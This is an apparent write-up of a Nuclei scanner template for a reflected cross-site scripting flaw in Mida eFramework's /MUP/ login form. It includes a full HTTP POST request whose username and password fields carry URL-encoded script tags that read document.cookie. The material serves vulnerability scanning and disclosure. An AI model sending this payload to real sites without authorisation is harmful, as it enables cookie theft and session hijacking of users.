# Nuclei Template: Mida eFramework - Cross-Site Scripting
**Template ID:** mida-eframework-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** High
**CWE:** CWE-80
**Source:** Nuclei Template (`mida-eframework-xss.yaml`)

## Vulnerability Information & PoC

## Description
Mida eFramework contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
POST /MUP/ HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: {{Hostname}}/MUP

UPusername=%22%3E%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E&UPpassword=%22%3E%3Cscript%3Ejavascript%3Aalert%28document.cookie%29%3C%2Fscript%3E
```

## References
- https://www.exploit-db.com/exploits/48768
